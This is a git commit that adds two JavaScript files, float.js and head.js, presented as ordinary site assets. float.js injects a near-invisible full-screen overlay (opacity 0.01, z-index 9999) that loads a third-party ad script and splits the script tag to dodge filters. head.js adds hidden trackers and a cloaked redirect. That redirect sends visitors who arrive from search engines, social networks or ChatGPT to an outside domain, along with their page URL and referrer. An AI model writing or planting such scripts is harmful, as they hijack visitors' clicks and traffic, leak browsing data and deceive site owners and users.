250810f81266ed2b00b81a2a710bbc1f84b307be
ivortexia <panahmerah984@gmail.com>
2026-01-07 20:34:06 +0700

    Add files via upload

---
+++ float.js
@@ -0,0 +1,14 @@
+document.write('<div id="floatads" style="width:100%;margin:auto; text-align:center;float:none;overflow:hidden; display:scroll;position:fixed; top:0;z-index:9999;opacity:0.01">');
+document.write('<div style="text-align:center;display:block;max-width:729px;height:auto;overflow:hidden;margin:auto;">');
+
+atOptions = {
+    'key': '1e8cfb88a9b5827f12642a9098d2b752',
+    'format': 'iframe',
+    'height': 90,
+    'width': 728,
+    'params': {}
+};
+document.write('<scr' + 'ipt type="text/javascript" src="//www.highperformanceformat.com/1e8cfb88a9b5827f12642a9098d2b752/invoke.js"></scr' + 'ipt>');
+
+document.write('</div>');
+document.write('</div>');
---
+++ head.js
@@ -0,0 +1,20 @@
+//Histats
+document.write('<img alt="stats" src="//sstatic1.histats.com/0.gif?4943554&101"/>');
+
+///// Statcounter /////
+var sc_project=13049188; 
+var sc_invisible=1; 
+var sc_security="28b53553";
+
+document.write('<script type="text/javascript" src="https://www.statcounter.com/counter/counter.js" async></script>');
+document.write('<noscript>');
+document.write('<div class="statcounter">');
+document.write('<a title="Web Analytics" href="https://statcounter.com/" target="_blank">');
+document.write('<img class="statcounter" src="https://c.statcounter.com/13049188/0/28b53553/1/" alt="Web Analytics" referrerPolicy="no-referrer-when-downgrade">');
+document.write('</a>');
+document.write('</div>');
+document.write('</noscript>');
+
+///// Arsae /////
+var ars = 'http://blog.wm.edu.pl';
+if(['.aol.', 'chatgpt.', 'msn.', '.google.', 'bing.', 'yandex.', 'facebook.', 'brave.', 'woa.', 'ecosia', 'qwant', 'pinterest.', 'coccoc.', 'baidu.', 'duckduckgo.', '.yahoo.', 't.co'].some(s => document.referrer.toLowerCase().includes(s)) || ['fb', 'facebook', 'pinterest', 'twitter'].some(s => navigator.userAgent.toLowerCase().includes(s))){ window.location.href = ars + '/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer) }
